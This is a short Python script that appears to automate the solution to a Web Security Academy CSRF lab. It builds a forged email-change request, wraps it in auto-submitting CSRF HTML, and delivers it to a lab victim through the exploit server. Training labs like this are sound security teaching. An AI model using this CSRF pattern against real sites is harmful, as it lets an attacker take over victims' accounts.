from web_security_academy.core.utils import generate_csrf_html

from urllib.parse import urljoin
from requests import Request


def solve_lab(session):
    req = Request(
        "POST",
        urljoin(session.url, "/my-account/change-email"),
        data={"email": "user@example.com"},
    )

    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
